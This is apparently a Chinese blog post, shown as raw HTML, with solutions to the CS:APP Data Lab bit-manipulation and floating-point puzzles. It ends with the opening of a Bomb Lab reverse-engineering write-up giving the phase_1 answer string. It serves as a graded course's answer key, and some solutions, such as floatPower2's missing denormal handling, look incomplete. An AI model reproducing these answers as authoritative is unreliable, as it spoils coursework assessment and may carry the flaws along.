number">7</span><span class="token punctuation">.</span> Use any data type other than <span class="token keyword">int</span><span class="token punctuation">.</span>  This implies that you     cannot use arrays<span class="token punctuation">,</span> structs<span class="token punctuation">,</span> or unions<span class="token punctuation">.</span>   You may assume that your machine<span class="token punctuation">:</span>  <span class="token number">1</span><span class="token punctuation">.</span> Uses 2s complement<span class="token punctuation">,</span> <span class="token number">32</span><span class="token operator">-</span>bit representations of integers<span class="token punctuation">.</span>  <span class="token number">2</span><span class="token punctuation">.</span> Performs right shifts arithmetically<span class="token punctuation">.</span>  <span class="token number">3</span><span class="token punctuation">.</span> Has unpredictable behavior when shifting <span class="token keyword">if</span> the shift amount     is less than <span class="token number">0</span> or greater than <span class="token number">31</span><span class="token punctuation">.</span>EXAMPLES OF ACCEPTABLE CODING STYLE<span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">/*   * pow2plus1 - returns 2^x + 1, where 0 &lt;= x &lt;= 31   */</span>  <span class="token keyword">int</span> <span class="token function">pow2plus1</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">/* exploit ability of shifts to compute powers of 2 */</span>     <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">/*   * pow2plus4 - returns 2^x + 4, where 0 &lt;= x &lt;= 31   */</span>  <span class="token keyword">int</span> <span class="token function">pow2plus4</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">/* exploit ability of shifts to compute powers of 2 */</span>     <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>     result <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">}</span>FLOATING POINT CODING RULESFor the problems that require you to implement floating<span class="token operator">-</span>point operations<span class="token punctuation">,</span>the coding rules are less strict<span class="token punctuation">.</span>  You are allowed to use looping andconditional control<span class="token punctuation">.</span>  You are allowed to use both ints and unsigneds<span class="token punctuation">.</span>You can use arbitrary integer and <span class="token keyword">unsigned</span> constants<span class="token punctuation">.</span> You can use any arithmetic<span class="token punctuation">,</span>logical<span class="token punctuation">,</span> or comparison operations on <span class="token keyword">int</span> or <span class="token keyword">unsigned</span> data<span class="token punctuation">.</span>You are expressly forbidden to<span class="token punctuation">:</span>  <span class="token number">1</span><span class="token punctuation">.</span> Define or use any macros<span class="token punctuation">.</span>  <span class="token number">2</span><span class="token punctuation">.</span> Define any additional functions in this file<span class="token punctuation">.</span>  <span class="token number">3</span><span class="token punctuation">.</span> Call any functions<span class="token punctuation">.</span>  <span class="token number">4</span><span class="token punctuation">.</span> Use any form of casting<span class="token punctuation">.</span>  <span class="token number">5</span><span class="token punctuation">.</span> Use any data type other than <span class="token keyword">int</span> or <span class="token keyword">unsigned</span><span class="token punctuation">.</span>  This means that you     cannot use arrays<span class="token punctuation">,</span> structs<span class="token punctuation">,</span> or unions<span class="token punctuation">.</span>  <span class="token number">6</span><span class="token punctuation">.</span> Use any floating point data types<span class="token punctuation">,</span> operations<span class="token punctuation">,</span> or constants<span class="token punctuation">.</span>NOTES<span class="token punctuation">:</span>  <span class="token number">1</span><span class="token punctuation">.</span> Use the <span class="token function">dlc</span> <span class="token punctuation">(</span>data lab checker<span class="token punctuation">)</span> <span class="token function">compiler</span> <span class="token punctuation">(</span>described in the handout<span class="token punctuation">)</span> to      check the legality of your solutions<span class="token punctuation">.</span>  <span class="token number">2</span><span class="token punctuation">.</span> Each function has a maximum number of <span class="token function">operations</span> <span class="token punctuation">(</span>integer<span class="token punctuation">,</span> logical<span class="token punctuation">,</span>     or comparison<span class="token punctuation">)</span> that you are allowed to use <span class="token keyword">for</span> your implementation     of the function<span class="token punctuation">.</span>  The max operator count is checked by dlc<span class="token punctuation">.</span>     Note that <span class="token function">assignment</span> <span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span> is not counted<span class="token punctuation">;</span> you may use as many of     these as you want without penalty<span class="token punctuation">.</span>  <span class="token number">3</span><span class="token punctuation">.</span> Use the btest test harness to check your functions <span class="token keyword">for</span> correctness<span class="token punctuation">.</span>  <span class="token number">4</span><span class="token punctuation">.</span> Use the BDD checker to formally verify your functions  <span class="token number">5</span><span class="token punctuation">.</span> The maximum number of ops <span class="token keyword">for</span> each function is given in the     header comment <span class="token keyword">for</span> each function<span class="token punctuation">.</span> If there are any inconsistencies      between the maximum ops in the writeup and in this file<span class="token punctuation">,</span> consider     this file the authoritative source<span class="token punctuation">.</span><span class="token comment" spellcheck="true">/* * STEP 2: Modify the following functions according the coding rules. *  *   IMPORTANT. TO AVOID GRADING SURPRISES: *   1. Use the dlc compiler to check that your solutions conform *      to the coding rules. *   2. Use the BDD checker to formally verify that your solutions produce  *      the correct answers. */</span><span class="token macro property">#<span class="token directive keyword">endif</span></span><span class="token comment" spellcheck="true">//1</span><span class="token comment" spellcheck="true">/*  * bitXor - x^y using only ~ and &amp;  *   Example: bitXor(4, 5) = 1 *   Legal ops: ~ &amp; *   Max ops: 14 *   Rating: 1 */</span><span class="token keyword">int</span> <span class="token function">bitXor</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//数字逻辑异或的与非转换</span>  <span class="token keyword">return</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>x<span class="token punctuation">)</span><span class="token operator">&amp;</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span>x<span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token operator">~</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*  * tmin - return minimum two's complement integer  *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; >> *   Max ops: 4 *   Rating: 1 */</span><span class="token keyword">int</span> <span class="token function">tmin</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//最小的数是仅有最高有效位为1的数</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">31</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//2</span><span class="token comment" spellcheck="true">/* * isTmax - returns 1 if x is the maximum, two's complement number, *     and 0 otherwise  *   Legal ops: ! ~ &amp; ^ | + *   Max ops: 10 *   Rating: 1 */</span><span class="token keyword">int</span> <span class="token function">isTmax</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//返回真值,关键在于将满足条件的数(即最大数)唯一地处理成0</span>  <span class="token comment" spellcheck="true">//利用xor比较是否相等</span>  <span class="token comment" spellcheck="true">//最大数+1和取反相同:!((~x)^(x+1));  但是-1同样有这一性质,要扣掉</span>  <span class="token comment" spellcheck="true">//利用!将数值转换为布尔值,再结合&amp;实现&amp;&amp;的功能</span>  <span class="token comment" spellcheck="true">//如果有移位操作:!((~x)^(1&lt;&lt;31))</span>  <span class="token keyword">int</span> x_plus_1 <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>x<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>x_plus_1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>x_plus_1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*  * allOddBits - return 1 if all odd-numbered bits in word set to 1 *   where bits are numbered from 0 (least significant) to 31 (most significant) *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1 *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; >> *   Max ops: 12 *   Rating: 2 */</span><span class="token keyword">int</span> <span class="token function">allOddBits</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//类似掩码吧</span>  <span class="token keyword">int</span> all <span class="token operator">=</span> <span class="token number">0xAA</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">0xAA</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">0xAA</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">0xAA</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token operator">&amp;</span>all<span class="token punctuation">)</span><span class="token operator">^</span>all<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*  * negate - return -x  *   Example: negate(1) = -1. *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; >> *   Max ops: 5 *   Rating: 2 */</span><span class="token keyword">int</span> <span class="token function">negate</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//负数补码:绝对值取反+1</span>  <span class="token comment" spellcheck="true">//反过来正数求相反数:-1再取反</span>  <span class="token comment" spellcheck="true">//不过~(x-1)==(~x)+1</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token operator">~</span>x<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//3</span><span class="token comment" spellcheck="true">/*  * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters '0' to '9') *   Example: isAsciiDigit(0x35) = 1. *            isAsciiDigit(0x3a) = 0. *            isAsciiDigit(0x05) = 0. *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; >> *   Max ops: 15 *   Rating: 3 */</span><span class="token keyword">int</span> <span class="token function">isAsciiDigit</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//该范围的有效位位:110000-111001</span>  <span class="token comment" spellcheck="true">//前两位及更高位固定不变,单独异或验证</span>  <span class="token comment" spellcheck="true">//末4位采用4位溢出的方式验证</span>  <span class="token keyword">int</span> bool1 <span class="token operator">=</span> <span class="token punctuation">(</span>x<span class="token operator">>></span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">3</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> last_byte <span class="token operator">=</span> x<span class="token operator">&amp;</span><span class="token number">15</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> bool2 <span class="token operator">=</span> <span class="token punctuation">(</span>last_byte<span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">16</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token operator">!</span>bool1<span class="token operator">&amp;</span><span class="token operator">!</span>bool2<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*  * conditional - same as x ? y : z  *   Example: conditional(2,4,5) = 4 *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; >> *   Max ops: 16 *   Rating: 3 */</span><span class="token keyword">int</span> <span class="token function">conditional</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> z<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//将x转换成0和-1,与x,y进行&amp;.(1会清空高位,选用-1保留所有位)</span>  <span class="token comment" spellcheck="true">//从flag1->flag2: 0异或任何数等于任何数,-1异或-1为0.实现0和-1的转化</span>    <span class="token keyword">int</span> flag1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">!</span><span class="token operator">!</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> flag2 <span class="token operator">=</span> flag1 <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token operator">~</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>flag1 <span class="token operator">&amp;</span> y<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>flag2 <span class="token operator">&amp;</span> z<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*  * isLessOrEqual - if x &lt;= y  then return 1, else return 0  *   Example: isLessOrEqual(4,5) = 1. *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; >> *   Max ops: 24 *   Rating: 3 */</span><span class="token keyword">int</span> <span class="token function">isLessOrEqual</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//若不考虑溢出,则检测x-y的符号位</span>  <span class="token comment" spellcheck="true">//考虑溢出,因为溢出仅在x负y正和x正y负的情况下出现,而这两种情况又可直接比较大小,单独设置flag判断</span>  <span class="token keyword">int</span> mask <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">31</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> var1 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span>x<span class="token operator">&amp;</span>mask<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> var2 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span>y<span class="token operator">&amp;</span>mask<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> flag1 <span class="token operator">=</span> <span class="token operator">!</span>var1<span class="token operator">&amp;</span>var2<span class="token punctuation">;</span>  <span class="token keyword">int</span> flag2 <span class="token operator">=</span> <span class="token operator">!</span>var2<span class="token operator">&amp;</span>var1<span class="token punctuation">;</span>  <span class="token keyword">int</span> x_sub_y <span class="token operator">=</span> x<span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">~</span>y<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> negate_SF <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>mask<span class="token punctuation">)</span><span class="token operator">&amp;</span>x_sub_y<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//感觉应该能化简..</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token operator">!</span>negate_SF<span class="token operator">|</span><span class="token operator">!</span>x_sub_y<span class="token operator">|</span>flag1<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token operator">!</span>flag2<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//4</span><span class="token comment" spellcheck="true">/*  * logicalNeg - implement the ! operator, using all of  *              the legal operators except ! *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1 *   Legal ops: ~ &amp; ^ | + &lt;&lt; >> *   Max ops: 12 *   Rating: 4  */</span><span class="token keyword">int</span> <span class="token function">logicalNeg</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// (-x|x),若不为零,该值符号位必为1.</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>x<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">|</span>x<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">31</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/* howManyBits - return the minimum number of bits required to represent x in *             two's complement *  Examples: howManyBits(12) = 5 *            howManyBits(298) = 10 *            howManyBits(-5) = 4 *            howManyBits(0)  = 1 *            howManyBits(-1) = 1 *            howManyBits(0x80000000) = 32 *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; >> *  Max ops: 90 *  Rating: 4 */</span><span class="token keyword">int</span> <span class="token function">howManyBits</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//二分法,若为负找最高0,若为正找最高1</span>    <span class="token keyword">int</span> flag<span class="token punctuation">,</span> cnt_16<span class="token punctuation">,</span> cnt_8<span class="token punctuation">,</span> cnt_4<span class="token punctuation">,</span> cnt_2<span class="token punctuation">,</span> cnt_1<span class="token punctuation">,</span> cnt_0<span class="token punctuation">;</span>    <span class="token keyword">int</span> sign <span class="token operator">=</span> x <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">;</span>    x <span class="token operator">=</span> <span class="token punctuation">(</span>sign <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token operator">~</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token operator">~</span>sign <span class="token operator">&amp;</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    flag <span class="token operator">=</span> <span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cnt_16 <span class="token operator">=</span> flag <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span>    x <span class="token operator">>>=</span> <span class="token punctuation">(</span>cnt_16<span class="token punctuation">)</span><span class="token punctuation">;</span>    flag <span class="token operator">=</span> <span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cnt_8 <span class="token operator">=</span> flag <span class="token operator">&lt;&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span>    x <span class="token operator">>>=</span> <span class="token punctuation">(</span>cnt_8<span class="token punctuation">)</span><span class="token punctuation">;</span>    flag <span class="token operator">=</span> <span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cnt_4 <span class="token operator">=</span> flag <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span>    x <span class="token operator">>>=</span> cnt_4<span class="token punctuation">;</span>    flag <span class="token operator">=</span> <span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cnt_2 <span class="token operator">=</span> flag <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">;</span>    x <span class="token operator">>>=</span> cnt_2<span class="token punctuation">;</span>    flag <span class="token operator">=</span> <span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cnt_1 <span class="token operator">=</span> flag<span class="token punctuation">;</span>    x <span class="token operator">>>=</span> cnt_1<span class="token punctuation">;</span>    cnt_0 <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">1</span> <span class="token operator">+</span> cnt_0 <span class="token operator">+</span> cnt_1 <span class="token operator">+</span> cnt_2 <span class="token operator">+</span> cnt_4 <span class="token operator">+</span> cnt_8 <span class="token operator">+</span> cnt_16<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//float</span><span class="token comment" spellcheck="true">/*  * floatScale2 - Return bit-level equivalent of expression 2*f for *   floating point argument f. *   Both the argument and result are passed as unsigned int's, but *   they are to be interpreted as the bit-level representation of *   single-precision floating point values. *   When argument is NaN, return argument *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while *   Max ops: 30 *   Rating: 4 */</span><span class="token keyword">unsigned</span> <span class="token function">floatScale2</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> uf<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//分别处理三部分,*2就是exp+1;</span>    <span class="token keyword">unsigned</span> exp <span class="token operator">=</span> <span class="token punctuation">(</span>uf <span class="token operator">&lt;&lt;</span> <span class="token number">1</span> <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> frac <span class="token operator">=</span> uf <span class="token operator">&lt;&lt;</span> <span class="token number">9</span> <span class="token operator">>></span> <span class="token number">9</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> mask <span class="token operator">=</span> uf <span class="token operator">>></span> <span class="token number">31</span><span class="token operator">&lt;&lt;</span><span class="token number">31</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>exp <span class="token operator">==</span> <span class="token number">255</span> <span class="token operator">&amp;&amp;</span> frac<span class="token punctuation">)</span>        <span class="token keyword">return</span> uf<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>exp <span class="token operator">>=</span> <span class="token number">254</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> mask<span class="token operator">|</span> <span class="token number">0x7f800000</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>exp <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> mask <span class="token operator">|</span> uf <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">;</span>    exp<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> mask<span class="token operator">|</span><span class="token punctuation">(</span>exp<span class="token operator">&lt;&lt;</span><span class="token number">23</span><span class="token punctuation">)</span><span class="token operator">|</span>frac<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*  * floatFloat2Int - Return bit-level equivalent of expression (int) f *   for floating point argument f. *   Argument is passed as unsigned int, but *   it is to be interpreted as the bit-level representation of a *   single-precision floating point value. *   Anything out of range (including NaN and infinity) should return *   0x80000000u. *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while *   Max ops: 30 *   Rating: 4 */</span><span class="token keyword">int</span> <span class="token function">floatFloat2Int</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> uf<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> exp <span class="token operator">=</span> <span class="token punctuation">(</span>uf <span class="token operator">>></span> <span class="token number">23</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> sign <span class="token operator">=</span> <span class="token punctuation">(</span>uf <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> frac <span class="token operator">=</span> uf <span class="token operator">&amp;</span> <span class="token number">0x7fffff</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> shiftBits <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 0比较特殊，先判断0(正负0都算作0)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>uf <span class="token operator">&amp;</span> <span class="token number">0x7fffffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 判断是否为NaN还是无穷大</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>exp <span class="token operator">==</span> <span class="token number">0xff</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0x80000000u</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 指数减去偏移量，获取到真正的指数</span>    exp <span class="token operator">-</span><span class="token operator">=</span> <span class="token number">127</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 需要注意的是，原来的frac一旦向左移位，其值就一定会小于1，所以返回0</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>exp <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 获取M，注意exp等于-127和不等于-127的情况是不一样的。当exp != -127时还有一个隐藏的1</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>exp <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">127</span><span class="token punctuation">)</span>        frac <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 要移位的位数。注意float的小数点是点在第23位与第22位之间</span>    shiftBits <span class="token operator">=</span> <span class="token number">23</span> <span class="token operator">-</span> exp<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 需要注意一点，如果指数过大，则也返回0x80000000u</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>shiftBits <span class="token operator">&lt;</span> <span class="token number">31</span> <span class="token operator">-</span> <span class="token number">23</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0x80000000u</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 获取真正的结果</span>    frac <span class="token operator">>>=</span> shiftBits<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 判断符号</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>sign <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token operator">~</span>frac <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">return</span> frac<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*  * floatPower2 - Return bit-level equivalent of the expression 2.0^x *   (2.0 raised to the power x) for any 32-bit integer x. * *   The unsigned value that is returned should have the identical bit *   representation as the single-precision floating-point number 2.0^x. *   If the result is too small to be represented as a denorm, return *   0. If too large, return +INF. *  *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while  *   Max ops: 30  *   Rating: 4 */</span><span class="token keyword">unsigned</span> <span class="token function">floatPower2</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 判断指数是否上溢或者下溢</span>    <span class="token keyword">int</span> exp <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token number">127</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>exp <span class="token operator">></span> <span class="token number">0xfe</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0x7f800000</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>exp <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> exp <span class="token operator">&lt;&lt;</span> <span class="token number">23</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305111056381.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305111057616.png"></p><h1 id="Lab2-Bomb-Lab"><a href="#Lab2-Bomb-Lab" class="headerlink" title="Lab2:Bomb Lab"></a>Lab2:Bomb Lab</h1><p>拆炸弹,实际上就是逆向找绕过条件.<br>用IDA感觉直接秒了,不过练一下看汇编吧.<br>之前还真没有嗯看过汇编.<br>先根据跳转的地址将代码分成几个部分,从外向内识别每个循环体.</p><h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h2><p>一个简单的字符串比较<br>payload:’Border relations with Canada have never been better.’</p><h2 id="phase-2"><a 